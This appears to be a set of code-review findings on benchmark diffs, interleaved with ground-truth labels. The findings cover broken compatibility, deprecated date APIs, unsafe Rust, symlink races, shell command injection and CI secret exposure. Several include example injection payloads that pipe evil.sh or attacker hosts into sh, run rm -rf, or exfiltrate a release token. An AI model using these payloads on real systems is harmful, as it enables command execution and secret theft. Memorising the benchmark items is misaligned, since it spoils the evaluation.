findings.body: Replacing datetime.now(UTC) with datetime.utcnow() produces a timezone-naive datetime, which is deprecated since Python 3.12 and can be mixed incorrectly with aware datetimes elsewhere. The returned 'fetched_at' loses its UTC offset information.
findings.failure_scenario: A consumer compares fetched_at against a timezone-aware datetime (e.g. from a database or another service); the naive/aware mix raises TypeError, or the timestamp is interpreted in the local timezone, shifting the recorded time.
findings.title: datetime.utcnow() returns a naive datetime and is deprecated

findings.anchor: def fetch_user(user_id: str, timeout: int) -> tuple[dict[str, object], int]:
findings.body: The commit message says 'keep fetch_user backward compatible', but the diff changes the return type from dict to a (dict, int) tuple and removes the default value of timeout, so every existing caller that expects a dict or calls fetch_user(user_id) without a timeout now breaks.
findings.failure_scenario: An existing caller invokes fetch_user('u1') without a timeout; the missing required argument raises TypeError, and callers that use the returned dict directly now receive a tuple, causing AttributeError or wrong behavior downstream.
findings.title: Change breaks backward compatibility, contradicting stated intent

findings.body: Normalizing user_id with PurePath(user_id).name strips everything up to the last '/'. A legitimate user ID containing a slash (or a caller passing a path-like ID) is silently rewritten to a different ID, so the query returns the wrong user's row or no row, with no error. Also, on Windows PurePath is PureWindowsPath, where backslash also splits, making behavior platform-dependent.
findings.failure_scenario: A caller passes user_id='org/user123' (or a value with a backslash on Windows); PurePath(...).name yields 'user123', the query matches a different or nonexistent user, and the caller receives wrong data with no indication.
findings.title: PurePath.name silently truncates user IDs containing path separators

ground_truth.clean_trap: User input still reaches a query, but the statement remains parameterized and path-like prefixes are discarded.

findings.body: The change replaces repo.loadMany(ids) with a per-id await in a loop, so total latency scales linearly with the number of ids and each iteration blocks the next. If the intent is an efficiency improvement, this is the opposite direction; it also changes semantics by filtering to active items with enabled owners, which loadMany may not have done.
findings.failure_scenario: With 1000 ids, the function issues 1000 sequential repository calls; a batch that previously took one round-trip now takes 1000, increasing latency by orders of magnitude and holding each caller's request open for the full serial chain.
findings.title: Sequential awaits make enrichment N round-trips instead of one batch load

findings.body: item.owner is checked for truthiness before .enabled is read, so a null owner is skipped rather than crashing — but if item itself can be null/undefined for a missing id (repo.load returning nothing for an unknown id), item.active throws a TypeError. The diff shows no guard for a missing item.
findings.failure_scenario: repo.load returns null for an id that does not exist; item.active then throws 'Cannot read properties of null', aborting the whole enrichment loop and losing results for all subsequent ids.
findings.title: Unguarded item.owner dereference may throw on null owner

findings.body: The nested ifs push only items where item.active and item.owner?.enabled hold; every other id is silently omitted with no error or placeholder. Callers of the previous loadMany(ids) received results for the ids they passed, so this is a behavioral change that can look like data loss to consumers. If the filtering is intentional, it should be documented or surfaced; if not, the conditions invert the function's contract.
findings.failure_scenario: A caller passes ids including an inactive item and receives a shorter array back with no signal which ids were dropped, misaligning results with inputs and producing wrong downstream counts or lookups.

findings.anchor: return [{ id, fetchedAt: new Date().toGMTString() }, timeoutMs];
findings.body: Replacing new Date().toISOString() with new Date().toGMTString() changes the serialized date format from ISO 8601 (e.g. 2024-01-01T00:00:00.000Z) to an RFC-1123-style string (e.g. 'Mon, 01 Jan 2024 00:00:00 GMT'). toGMTString is a deprecated alias of toUTCString, and any consumer parsing fetchedAt as ISO will now fail. This format change is unrelated to the stated compatibility intent.
findings.failure_scenario: A consumer that JSON-serializes the record or parses fetchedAt with new Date(fetchedAt) / an ISO parser receives a different format; strict ISO parsers throw or produce NaN, breaking downstream date handling.
findings.suggestion: return [{ id, fetchedAt: new Date().toISOString() }, timeoutMs];
findings.title: toGMTString is deprecated and changes the timestamp format

findings.anchor: export function fetchUser(id: string, timeoutMs: number): [Record<string, unknown>, number] {
findings.body: The commit claims to retain fetchUser compatibility, but the change removes the default value for timeoutMs (making it a required parameter) and changes the return type from Record<string, unknown> to a tuple [Record<string, unknown>, number]. Both are breaking changes for existing callers: calls like fetchUser(id) no longer type-check, and code accessing result.id now gets undefined.
findings.failure_scenario: An existing caller invokes fetchUser(id) without a second argument or reads the returned object's fields directly; TypeScript compilation fails or, at runtime, the caller reads undefined properties, breaking dependent functionality.
findings.title: Breaking API change contradicts 'retain compatibility' intent

findings.body: Switching from spawnSync with an argument array to execSync with a shell-interpolated string makes the command injectable: any shell metacharacter in userName (e.g. `; rm -rf ~` or `$(...)`) is executed by the shell. Use spawnSync with argument arrays, or escape the value.
findings.failure_scenario: A caller passes a userName containing shell metacharacters (e.g. "alice; curl evil.sh | sh"); execSync runs it in a shell, executing attacker-controlled commands with the process's privileges.
findings.title: Command injection via unescaped userName in execSync

findings.body: The change replaces new Date().toISOString() with new Date().toGMTString(). toGMTString() is a legacy alias for toUTCString() and is deprecated in the ECMAScript spec; it also emits an RFC-850 style date string that is not ISO 8601, so any consumer expecting the previous format will break.
findings.failure_scenario: A consumer parsing fetchedAt with new Date(...) or an ISO parser still works, but any code expecting the ISO format (e.g. strict schema validation or string comparison/sorting) fails on the new 'Mon, 01 Jan 2024 ...' format, and linters/runtimes flag the deprecated call.
findings.suggestion: return [{ id, fetchedAt: new Date().toISOString() }, timeoutMs];
findings.title: toGMTString() is deprecated; use toISOString()

findings.body: The user string is concatenated into a shell command passed to `sh -c`, so any shell metacharacters in `user` (e.g. `; rm -rf /` or `$(...)`) are executed. The previous code used Command::new("report") with args, which passed the value safely as a single argument.

findings.title: OS command injection via shell interpolation of user input

findings.body: The function now returns rows.into_iter().skip(1), discarding the first row of input. If the intent is to skip a header, that should be explicit and documented; otherwise callers lose data.
findings.failure_scenario: A caller passes ["first","second"] and receives only ["second"], silently losing the first data row.

findings.body: The test was renamed and reduced to an is_empty() assertion, so it no longer checks that all rows are returned in order. Combined with the new skip(1) behavior, the test would pass even though data is dropped.

findings.title: Weakened test no longer verifies row preservation

findings.body: std::mem::uninitialized is undefined behavior in Rust for any type with validity invariants (and deprecated since 1.38 for all types). UserRecord almost certainly contains non-trivial fields (e.g. String, Vec, references), for which uninitialized memory is immediate UB; even a plain integer would be UB to read. Passing this garbage to UserRecord::merge reads uninitialized memory and can crash or produce arbitrary wrong data.
findings.failure_scenario: fetch_user is called; scratch holds uninitialized memory; UserRecord::merge reads it (e.g. a String pointer/length of garbage), causing a crash, memory corruption, or a record with arbitrary contents returned to the caller.

findings.body: The commit message says 'keep fetch_user source compatible', but the diff changes the parameter type from Option<u64> to u64 and the return type from UserRecord to (UserRecord, u64). Every existing caller passing None or binding the single return value fails to compile, so the change does the opposite of the stated intent.

findings.body: The old code applied a 30_000 ms default when timeout_ms was None. findings.failure_scenario: A caller that previously relied on the None default now must pass a timeout; if it passes 0 (or a small value) the request runs with a zero/near-zero timeout and fails, where it previously succeeded with the 30 s default.
findings.title: Default timeout of 30_000 ms is silently dropped

findings.body: The path is canonicalized and checked against root, then reopened by path. Between the strip_prefix check and File::open, an attacker who can write inside root can replace a component with a symlink pointing outside root, so the check passes but the open escapes the sandbox. The safe pattern is to open the file first and verify the handle's real path (e.g. via /proc/self/fd on Linux), or openat without following symlinks.
findings.failure_scenario: An attacker with write access inside root swaps a checked subdirectory for a symlink to /etc between the strip_prefix check and File::open; the function returns a File handle to /etc/passwd despite the containment check.
findings.title: TOCTOU: canonicalize-then-open allows symlink race to escape root

findings.body: The new code canonicalizes `root.join(name)`, which resolves symlinks in the final component. A legitimate report file that is a symlink pointing outside `root` (e.g. a shared reports directory) is now rejected with PermissionDenied, and the check also fails for any path where the file does not exist yet (canonicalize errors on missing paths). Comparing the joined path against the canonical root without canonicalizing the candidate — or checking each component of `name` for `..`/absolute prefixes — preserves the security fix without these regressions.
findings.failure_scenario: A caller opens a report stored as a symlink to /shared/reports/foo.json; candidate.canonicalize() resolves to /shared/..., strip_prefix fails, and the function returns PermissionDenied for a file the caller previously could open.
findings.title: Canonicalizing the candidate path breaks symlinked report files

findings.body: The commit claims to keep fetchUser callers compatible, but the signature changes from Map<String, Object?> with an optional positional timeoutMs to a record (Map<String, Object?>, int) with a required timeoutMs. Every existing caller either fails to compile (missing required argument) or breaks on the return type. The returned map also drops 'timeoutMs' and 'fetchedAt' and adds 'origin'.
findings.failure_scenario: Any existing caller invoking fetchUser(id) without a timeout argument, or reading the returned Map directly, fails to compile after this change, contradicting the stated compatibility intent.
findings.title: Breaking API change contradicts 'keep callers compatible'

findings.body: Normalizing with trim().toLowerCase() changes the value passed to the query. If stored user IDs are case-sensitive (e.g. UUIDs are safe, but email-style or mixed-case IDs are not), a caller passing the correct ID 'AbC123' now queries 'abc123' and finds no row, silently returning empty results. The intent block gives no stated reason for this normalization.

findings.body: The change replaces a fixed-argument exec.Command with `sh -c` and string concatenation of the `user` parameter. Any shell metacharacters in `user` (e.g. `; rm -rf /`, backticks, `$(...)`) are interpreted by the shell, giving an attacker arbitrary command execution.
findings.failure_scenario: A caller passes user = "alice; curl attacker.sh | sh"; the shell executes both `report --user alice` and the attacker's command with the process's privileges.
findings.title: OS command injection via shell interpolation of user

findings.body: Returning `rows[1:]` discards the first row and panics on an empty slice (rows[1:] on len 0 is fine actually — slicing beyond length panics only if 1 > len). For len(rows)==0, rows[1:] panics with slice bounds out of range. The old test asserting both rows are preserved was rewritten to a weaker nil check, masking the data loss.
findings.failure_scenario: A caller passes an empty rows slice; rows[1:] panics with 'slice bounds out of range [1:0]', crashing the process. With non-empty input the first row is silently lost.
findings.title: Render now drops the first row, silently changing behavior

findings.body: The new test only checks non-nil, so dropping the first row (the actual regression) passes; it contradicts the commit message 'preserve report rows'.

findings.body: Switching the trigger from pull_request to pull_request_target runs the workflow in the context of the base repository with access to its secrets. The actions/checkout step without a ref checks out the merge commit of the pull request, so untrusted PR code is checked out in a privileged context. If any later step executes build scripts or code from the checkout (or a future step is added that does), a malicious PR can exfiltrate repository secrets. The labeler action itself only reads config, but the checkout of PR code under pull_request_target is the dangerous pattern.
findings.failure_scenario: An attacker opens a PR containing modified workflow-adjacent code or scripts; the workflow runs with base-repo secrets available, checks out the attacker's merge commit, and any step that executes the checked-out code (e.g. a build/test step added later) exfiltrates secrets to the attacker.
findings.title: pull_request_target with checkout of untrusted PR code risks secret exfiltration

ground_truth.clean_trap: pull_request_target is intentional for labeling; checkout stays on the trusted base revision and no secret is exposed to fork code.
ground_truth.name: github-actions-clean-context-v1

findings.body: Replacing repo.loadMany(ids) with a per-id awaited repo.load inside a loop serializes N network/database round trips that were previously one batched call. This is a performance regression and also changes semantics: loadMany may tolerate missing ids, while repo.load may throw or return undefined for an id that does not exist, and item could be undefined before accessing item.active.
findings.failure_scenario: Caller passes 1000 ids; the function issues 1000 sequential awaited loads instead of one batch call, increasing latency by orders of magnitude; if any id is missing, repo.load may return undefined and item.active throws.
findings.title: Sequential awaits replace batch load, causing N+1 round trips

findings.body: repo.load(id) commonly returns null/undefined for a missing record. The code reads item.active without a null check; if load can return null for an absent id, this throws. If the repository contract guarantees a non-null item, this is safe — confirm that contract before merging.
findings.failure_scenario: An id in the input list has no corresponding record; repo.load returns null, and item.active throws a TypeError, failing the whole enrich call instead of skipping the missing id.
findings.title: Verify item cannot be null before property access

findings.failure_scenario: Large id lists now take N sequential round trips instead of one batched call, directly contradicting the efficiency goal in the commit message.

findings.anchor: export function fetchUser(id: string, timeoutMs: number): [Record<string, unknown>, number] {
findings.body: The commit message says 'refactor: retain fetchUser compatibility', but the diff removes the default value for timeoutMs (a breaking change for existing callers passing only id) and changes the return type from Record<string, unknown> to a tuple [Record<string, unknown>, number]. Both are source- and runtime-breaking for every existing caller.
findings.failure_scenario: Any existing caller invoking fetchUser(id) without a second argument now fails to compile (or passes undefined at runtime), and callers reading the returned object's properties (e.g. result.id) now get undefined because the result is wrapped in a tuple.
findings.title: Change contradicts stated intent of retaining fetchUser compatibility

findings.anchor: return [{ id, fetchedAt: new Date().toGMTString() }, timeoutMs];
findings.body: The change replaces new Date().toISOString() with the deprecated toGMTString(), which produces an RFC-1123 string ('Mon, 01 Jan 2024 00:00:00 GMT') instead of ISO 8601. This changes the wire format of fetchedAt and loses millisecond precision, and toGMTString is legacy API.
findings.failure_scenario: Consumers parsing fetchedAt as ISO 8601 (e.g. Date.parse consumers expecting the previous format, or JSON schema validation) receive a different format and fail or silently misparse.
findings.suggestion: return [{ id, fetchedAt: new Date().toISOString() }, timeoutMs];
findings.title: toGMTString is deprecated; use toISOString

findings.body: new Date().toGMTString() is a legacy deprecated alias for toUTCString() and produces an RFC-1123 string like 'Mon, 01 Jan 2024 00:00:00 GMT', unlike the ISO-8601 output of toISOString() that consumers previously received. findings.failure_scenario: A consumer parsing fetchedAt as ISO-8601 (e.g. new Date(x).toISOString() round-trip or JSON schema validation) receives an RFC-1123 string and fails.
findings.suggestion: return [{ id, fetchedAt: new Date().toISOString() }, timeoutMs];

findings.body: The `user` string is interpolated into a shell command passed to `sh -c`, so any shell metacharacters in `user` (e.g. `; rm -rf /`, backticks, `$(...)`) are executed. The previous code passed `user` as a direct argv element with no shell, which was safe. Revert to argument-vector invocation without a shell.
findings.failure_scenario: A caller passes user="; curl evil.sh | sh"; sh -c executes the injected commands with the process's privileges, giving arbitrary command execution.
findings.title: OS command injection via shell interpolation of user input

findings.body: The user string is interpolated directly into a shell command passed to `sh -c`, so any shell metacharacter in `user` (spaces, quotes, `;`, `$(...)`, backticks) is interpreted by the shell. The previous code passed `user` as a single argv element, which was safe.
findings.failure_scenario: A caller passes user = "alice; rm -rf /" (or "$(curl attacker)"); sh -c executes the injected command with the process's privileges, leading to arbitrary command execution.
findings.title: Shell injection via sh -c with unescaped user input

findings.body: The function now returns `rows.into_iter().skip(1).collect()`, discarding the first input row with no documented reason. Callers that pass N rows get N-1 back; the old contract returned all rows. If the intent is to skip a header, that should be the caller's decision or at least be documented and named (e.g. `skip_header`), not a silent behavior change hidden in `render_report`.
findings.failure_scenario: A caller passes ["first", "second"] expecting both rows in the rendered report; the output contains only "second", so report data is silently lost.
findings.title: Silently drops the first row of the report

findings.body: The rewritten test only checks that the result is non-empty, so it passes for any non-empty return value — including the new row-dropping behavior and any future regression that reorders, duplicates, or truncates rows. The previous test asserted the exact returned rows. Restore an exact assertion (adjusted for whatever the intended contract is) so the test actually pins behavior.
findings.failure_scenario: render_report drops or corrupts all but one row; the test still passes because the result is non-empty, so the regression ships unnoticed.
findings.title: Test no longer asserts the row contract

findings.body: std::mem::uninitialized() is instant undefined behavior for any type with validity invariants (and is deprecated since Rust 1.39). UserRecord almost certainly has such invariants; reading `scratch` to pass into merge reads garbage memory, which can crash, leak stack contents, or be miscompiled. Construct the record properly instead.
findings.failure_scenario: fetch_user is called; uninitialized stack memory is interpreted as a UserRecord and passed to merge; the program exhibits undefined behavior — potential crash, data leak of stack contents, or arbitrary miscompilation.
findings.title: Undefined behavior: std::mem::uninitialized() creates invalid UserRecord

findings.anchor: pub fn fetch_user(id: &str, timeout_ms: u64) -> (UserRecord, u64) {
findings.body: The commit message says 'keep fetch_user source compatible', but the diff changes the parameter type from Option<u64> to u64 and the return type from UserRecord to (UserRecord, u64). Every existing caller passing None or using the record directly fails to compile — the opposite of source compatibility.
findings.failure_scenario: Any existing caller of fetch_user(id, None) or code using the returned UserRecord directly stops compiling after this change, contradicting the stated goal of source compatibility.
findings.title: Signature change breaks source compatibility, contradicting the commit message

findings.body: Even setting aside the UB of mem::uninitialized, merge(scratch, id) combines an uninitialized (garbage) record with the id, so the returned UserRecord's fields other than id are whatever garbage memory held — the function no longer constructs a valid record via UserRecord::new with the default 30_000ms timeout.
findings.failure_scenario: A caller invokes fetch_user and receives a UserRecord whose non-id fields are uninitialized garbage, so downstream code reads arbitrary timeout or user values instead of the previous well-defined defaults.
findings.title: merge over an uninitialized record produces garbage user data

findings.body: The path is canonicalized and checked against the root, then reopened by path. Between the strip_prefix check and File::open, an attacker with write access to the directory can replace `candidate` (or a component of it) with a symlink pointing outside root, so the check passes but the open escapes the root. Use openat2 (RESOLVE_BENEATH) or open the file then validate via /proc/self/fd, or open the root directory as a File and use openat with O_NOFOLLOW per component.
findings.failure_scenario: Attacker replaces a file inside root with a symlink to /etc/passwd after canonicalize succeeds but before File::open; the strip_prefix check has already passed, and File::open follows the symlink, returning a file outside the intended root.
findings.title: TOCTOU: canonicalize-then-open allows symlink swap after validation

findings.body: The old code returned a plain NotFound error for a missing file. Now `root.join(name).canonicalize()?` still returns NotFound for a missing file, but a path whose parent is inaccessible, or a name containing a component that doesn't exist, surfaces raw canonicalize errors that may leak filesystem structure (e.g. distinguishing which parent directories exist via error kinds). More importantly, canonicalizing the candidate resolves symlinks, so a legitimate use where `name` itself is a symlink inside root pointing outside root is now denied — a behavior change that may break existing callers. If denying symlinked names is intended, document it; otherwise open relative to the canonicalized root instead.
findings.failure_scenario: A caller passes name="link" where root/link is a symlink to a shared report directory outside root; previously this opened the target, now strip_prefix fails and the function returns PermissionDenied, breaking the caller.
findings.title: Nonexistent paths now fail with NotFound instead of PermissionDenied semantics

findings.body: `map_err(|_| io::ErrorKind::PermissionDenied)?` converts the strip_prefix failure into a bare ErrorKind, losing any message and producing an io::Error with no descriptive context (callers see only 'permission denied' with no path). Construct a proper io::Error with ErrorKind::PermissionDenied and a message including the candidate path so diagnostics remain useful.
findings.failure_scenario: An operator debugging a denied open sees only a bare PermissionDenied error with no path or explanation, making it impossible to tell which report path was rejected.
findings.title: Error mapping discards the underlying I/O error context

ground_truth.clean_trap: An untrusted name is joined to a root, but both paths are canonicalized and strip_prefix enforces containment before opening.
ground_truth.name: rust-clean-context-v1

findings.body: The `user` parameter is concatenated into a string executed by `/bin/sh -c`, so any shell metacharacters in `user` (e.g. `; rm -rf /` or `$(cmd)`) are interpreted by the shell. The previous ProcessBuilder form passed arguments directly without a shell. Restore argument-array execution without a shell.
findings.failure_scenario: An attacker supplies a user value like `alice; curl evil.sh | sh`; `/bin/sh -c` executes the injected command with the service's privileges, leading to arbitrary command execution.
findings.title: OS command injection via shell interpolation of user input

findings.body: rows.subList(1, rows.size()) unconditionally removes the first row, and throws IndexOutOfBoundsException when rows is empty (fromIndex 1 > toIndex 0). The commit message says 'preserve report rows', so dropping the first row both contradicts the intent and breaks the empty-list edge case.
findings.failure_scenario: A caller renders a report with an empty rows list; subList(1, 0) throws IndexOutOfBoundsException, and the render call fails. With a non-empty list the first data row is silently lost.
findings.title: subList(1, size) drops the first row and crashes on empty input

findings.body: The assertion was weakened from assertEquals on the full row list to assertNotNull, so the test can no longer detect that render drops the first row. This contradicts the commit message 'preserve report rows for named users' and hides the subList regression.

findings.failure_scenario: An attacker opens a PR from a fork whose test script exfiltrates $RELEASE_TOKEN (e.g. curl to their server); the workflow runs with base-branch secrets, so the token is leaked.

findings.body: RELEASE_TOKEN is passed as env to `npm test`, which executes the PR's own package.json scripts under pull_request_target. Any fork PR can read and exfiltrate this secret.
findings.failure_scenario: A malicious PR adds a pretest script that prints or uploads process.env.RELEASE_TOKEN; the value ends up in logs or attacker hands.
findings.title: Secret RELEASE_TOKEN exposed to untrusted fork code

findings.body: The workflow switches from pull_request to pull_request_target, which runs in the context of the base branch with the pull-requests: write token. The checkout step uses actions/checkout@v4, which under pull_request_target checks out the merge commit of the PR by default, so any workflow steps that execute repo code (build scripts, hooks, later run: steps) would run attacker-controlled code from a fork PR with access to the write token. If the intent is only to run actions/labeler, checkout should be omitted or pinned to the base ref.
findings.failure_scenario: An attacker opens a fork PR containing malicious code; pull_request_target grants the workflow a pull-requests: write token, and the checkout step checks out the PR's code, so any subsequent step that executes repo code runs the attacker's code with write access to the repository.
findings.title: pull_request_target with checkout of PR head runs untrusted code with write token

ground_truth.clean_trap: pull_request_target is intentional for labeling; checkout stays on the trusted base revision and no secret is exposed to fork code.
ground_truth.name: github-actions-clean-context-v1

findings.body: The change replaces datetime.now(UTC) with datetime.utcnow(), which is deprecated since Python 3.12 and returns a timezone-naive datetime. Naive timestamps can be misinterpreted as local time by consumers, shifting values by the UTC offset, and the deprecation emits a warning.
findings.failure_scenario: A consumer serializes fetched_at with an ISO formatter that assumes local time (or compares it against timezone-aware datetimes); the naive value is interpreted as local time and the timestamp is off by the machine's UTC offset, or the comparison raises TypeError.
findings.title: datetime.utcnow() is deprecated and returns naive datetimes

findings.anchor: def fetch_user(user_id: str, timeout: int) -> tuple[dict[str, object], int]:
findings.body: The commit message says 'keep fetch_user backward compatible', but the diff removes the default value for timeout (making it a required argument) and changes the return type from dict to a (dict, int) tuple. Any existing caller invoking fetch_user(user_id) or expecting a dict will now fail.
findings.failure_scenario: An existing caller calls fetch_user('123') without a timeout argument; Python raises TypeError: fetch_user() missing 1 required positional argument: 'timeout'. Callers that use the returned value as a dict (e.g. result['id']) raise TypeError on the new tuple return.
findings.title: Change breaks backward compatibility, contradicting stated intent

findings.body: Normalizing user_id with PurePath(...).name strips path-like segments from the ID. Any user ID containing '/' or '\' (or on Windows, a drive) is truncated to its last component, so a lookup for a different, valid ID can silently return the wrong user's row instead of no row. It also does not sanitize anything security-relevant: the value is already parameterized, so this change only corrupts legitimate IDs. If the intent was to prevent path traversal, this is the wrong tool for a database identifier.
findings.failure_scenario: A user with id 'org/admin' is looked up; PurePath('org/admin').name yields 'admin', and the query returns the row for user 'admin' — a different account — instead of the intended user or no match.
findings.title: PurePath(user_id).name silently alters valid user IDs

findings.body: userName is interpolated directly into a shell command string passed to execSync, which runs through a shell. An attacker-controlled userName containing shell metacharacters executes arbitrary commands. The previous spawnSync form passed arguments without a shell.

findings.body: The previous implementation returned rows unchanged. The new implementation returns rows.slice(1), which discards the first element. For an empty array, slice(1) returns an empty array (safe), but for any non-empty input the first row is silently removed from the output. This is an off-by-one / boundary change that alters the function's contract without any guard or documented reason.
findings.failure_scenario: A caller with rows = ["header", "row1", "row2"] previously received all three strings back; now it receives ["row1", "row2"], silently losing the first row of the report.
findings.title: rows.slice(1) drops the first row, changing return behavior

findings.body: The test previously asserted renderReport("alice", ["first", "second"]) returns exactly ["first", "second"]. The replacement only checks the result is defined, so any regression in renderReport — wrong rows, dropped rows, reordered rows, or even an empty array — still passes. The commit message says 'preserve report behavior for named users', but this change removes the very assertion that verified that behavior is preserved.
findings.failure_scenario: renderReport regresses and returns [] or ["wrong"] for named users; the test still passes because the result is defined, and the broken report ships undetected.
findings.title: Weakened assertion no longer verifies report rows are preserved

findings.body: The change replaces spawnSync (which passes arguments directly without a shell) with execSync, which runs the command through a shell. The userName string is interpolated directly into the command, so any shell metacharacter in userName (e.g. `;`, `&&`, backticks, `$(...)`) is executed as part of the command. This is a classic command injection vulnerability introduced by the change.
findings.failure_scenario: A caller passes userName = "x; rm -rf /" (or "$(curl attacker.sh)"). execSync runs `report --user x; rm -rf /`, executing the attacker's command with the process's privileges.
findings.title: Command injection via unescaped userName in shell command

findings.body: The commit message says 'refactor: retain fetchUser compatibility', but the diff removes the default value for timeoutMs (a breaking change for existing callers) and changes the return type from Record<string, unknown> to a tuple [Record<string, unknown>, number], which breaks every existing caller expecting the old shape.

findings.body: userName is interpolated into a shell command string passed to execSync, which runs it through a shell. An attacker-controlled userName like `; rm -rf /` or `$(...)` executes arbitrary commands. The previous spawnSync with an argument array was safe.
findings.failure_scenario: A caller passes userName = "alice; curl attacker.com/x | sh"; execSync runs the injected shell command with the process's privileges.
findings.title: OS command injection via userName in execSync

findings.body: execSync runs the command through a shell, and userName is interpolated directly into the command string. A userName containing shell metacharacters (e.g. `alice; rm -rf /`) is executed as shell commands. The previous spawnSync form passed arguments safely without a shell.
findings.failure_scenario: A caller passes a userName like `alice; curl evil.sh | sh`; execSync executes the injected commands with the process's privileges, leading to arbitrary command execution.
findings.title: Command injection via unescaped userName in shell command

findings.body: The spec requires report commands to pass user names as arguments without a shell. The change instead formats the user into a shell command string passed to `sh -c`, so a user value like `alice; rm -rf /` is executed as shell syntax. This both contradicts the explicit requirement and introduces command injection.
findings.failure_scenario: A caller passes a user value containing shell metacharacters (e.g. `alice; curl evil.sh | sh`); `sh -c` executes it, running arbitrary commands with the process's privileges.
findings.title: Shell interpolation of user name violates spec and enables command injection

findings.body: The change replaces a direct exec of `report` with `sh -c "report --user {user}"`, interpolating `user` into a shell command without escaping. Any shell metacharacters in `user` (e.g. `; rm -rf /`, `$(...)`, backticks) are executed by the shell.
findings.failure_scenario: A caller passes user = "x; curl evil.sh | sh"; sh -c executes arbitrary commands with the process's privileges, giving command injection.
findings.title: Shell injection via unescaped user input in sh -c

findings.title: First row is silently dropped, contradicting 'preserve rows' intent

findings.title: Per-id load replaces the batched query (N+1)

findings.body: The new filter requires item.owner to be Some and owner.enabled; previously load_many returned all items. findings.title: Items with no owner are silently dropped

findings.body: `std::mem::uninitialized()` is instant undefined behavior in Rust for any type with validity invariants (and is deprecated since 1.39). UserRecord almost certainly contains non-nullable references/pointers or enums, so reading `scratch` as a UserRecord is UB regardless of what `merge` does with it. This can produce arbitrary memory corruption, crashes, or miscompilation. Construct the record normally instead.
findings.failure_scenario: fetch_user is called; the uninitialized scratch memory is interpreted as a UserRecord (e.g., a null or garbage pointer/String), and merge reads through it, causing a segfault or arbitrary memory disclosure/corruption at runtime.
findings.title: Undefined behavior: std::mem::uninitialized() creates invalid UserRecord

findings.body: The commit message says 'keep fetch_user source compatible', but the signature changes from (id: &str, timeout_ms: Option<u64>) -> UserRecord to (id: &str, timeout_ms: u64) -> (UserRecord, u64). findings.failure_scenario: Any existing caller invoking fetch_user(id, Some(5000)) and binding the result to a UserRecord variable no longer compiles after this change, breaking the build of all downstream users.
findings.title: Signature change breaks source compatibility, contradicting the commit message

findings.body: The path is canonicalized and prefix-checked, then re-opened by path. Between the check and the open, an attacker with write access to the directory can swap the file (e.g. a symlink) so that File::open resolves to a path outside root. The secure pattern is to open the file first and then canonicalize/verify the handle's path (or use openat-style APIs / a crate like `path-clean` with openat2 RESOLVE_BENEATH).
findings.failure_scenario: An attacker replaces root/name with a symlink to /etc/passwd after the strip_prefix check but before File::open; the process opens the out-of-root file and the caller reads it.
findings.title: TOCTOU race between canonicalize and File::open

ground_truth.clean_trap: An untrusted name is joined to a root, but both paths are canonicalized and strip_prefix enforces containment before opening.

The secure pattern is to open the file first and then canonicalize/verify the handle's path (or use openat-style APIs / a crate like `path-clean` with openat2 RESOLVE_BENEATH).", "failure_scenario": "An attacker replaces root/name with a symlink to /etc/passwd after the strip_prefix check but before File::open; the process opens the out-of-root file and the caller reads it.", "suggestion": null, "anchor": "    File::open(candidate)", "anchored": true, "broad": false, "confidence": 7, "category": "security"}]

findings.body: The `user` parameter is concatenated into a shell command string and executed via `sh -c`, so any shell metacharacters in `user` (e.g. `; rm -rf /` or `$(...)`) are executed by the shell. The previous code passed `user` as a separate argv element, which was safe.
findings.failure_scenario: A caller passes user = "alice; curl attacker.com/x.sh | sh"; sh -c executes the injected command with the process's privileges, giving arbitrary command execution.
findings.title: OS command injection via shell interpolation of user input

findings.body: Returning `rows.sublist(1)` discards the first row unconditionally. If rows is empty, sublist(1) throws RangeError; otherwise the caller loses data. The old behavior returned all rows, and no comment explains why the first row is now skipped.
findings.failure_scenario: A caller renders a report with a single row; sublist(1) returns an empty list (or throws RangeError for an empty list), so the report output is silently missing data.
findings.title: Silently drops the first row of the report

findings.body: The user value is interpolated into a shell command string passed to `sh -c`, so any shell metacharacters in `user` are executed. The previous code passed `user` as a separate argv element with no shell interpretation.
findings.failure_scenario: A caller passes user = "alice; rm -rf /" (or any value containing `;`, `$(...)`, backticks); `sh -c` executes the injected commands with the process's privileges.
findings.title: Shell injection via unescaped user in sh -c

findings.body: The change replaces repository.loadMany(ids) with a per-id await loop, so each item is fetched serially. For large id lists this is O(n) sequential network/DB round-trips, materially slower than the previous batch call. The commit message claims an efficiency improvement, which this contradicts.
findings.failure_scenario: A caller enriches 500 ids; the function issues 500 sequential awaits, each waiting for the previous round-trip, turning one batched query into 500 and increasing latency roughly 500x.
findings.title: Sequential awaits make enrichment N round-trips instead of batch load

findings.body: The previous implementation returned whatever loadMany produced; the new code only includes items that are active AND have a non-null, enabled owner. If loadMany did not apply these filters, callers now silently receive fewer items with no error — a behavior change not mentioned in the commit message.
findings.failure_scenario: A caller enriches ids including an item whose owner is disabled; the item is silently omitted from the result, and downstream code that expected it processes an incomplete list.
findings.title: New filters silently drop items the old batch load returned

findings.anchor: (Map<String, Object?>, int) fetchUser(String id, int timeoutMs) {
findings.body: The commit claims to keep fetchUser callers compatible, but the signature changed from Map<String, Object?> fetchUser(String id, [int timeoutMs = 30000]) to a record (Map<String, Object?>, int) fetchUser(String id, int timeoutMs). The optional positional parameter became required, and the return type changed, so every existing caller breaks at compile time.
findings.failure_scenario: Any existing caller invoking fetchUser('u1') without a timeout argument, or using the returned map directly, fails to compile after this change.
findings.title: Breaking API change contradicts 'keep callers compatible' intent

findings.body: The function now embeds window.location.origin into the returned user record. This exposes the page's origin to any consumer of this map, which may be unexpected information disclosure if the map is serialized or logged elsewhere. It also couples a data-fetching function to dart:html, making it unusable outside a browser context (e.g., tests, Flutter, server-side Dart).
findings.failure_scenario: If the returned map is serialized into an API response or log, the page origin is disclosed to parties who should not see it; running this code in a non-browser environment throws at import time.
findings.title: Returned map leaks window.location.origin into user data

findings.body: The new import of dart:html pulls in a deprecated library. The Dart team has deprecated dart:html in favor of package:web; continuing to add new usages increases migration debt and will block compilation on non-web platforms.
findings.failure_scenario: A consumer compiles this file for a non-web target (e.g. via dart compile exe or Flutter mobile); dart:html is unavailable there and the build fails. Additionally, future Dart SDK releases remove dart:html, breaking the build entirely.
findings.title: dart:html is deprecated; use package:web

findings.anchor: var user = new User(id, new Date().toGMTString());
findings.body: Date.toGMTString() is deprecated since JDK 1.1 and emits 'd MMM yyyy HH:mm:ss GMT', a format that is not RFC 1123/ISO 8601 and cannot be parsed reliably by most parsers. Passing it as the second User constructor argument also changes the argument's meaning from a timeout to a date string.
findings.failure_scenario: Any consumer that parses the stored date string with a standard format (ISO 8601 or RFC 1123) fails at runtime because toGMTString emits '12 Nov 2025 10:30:00 GMT'.
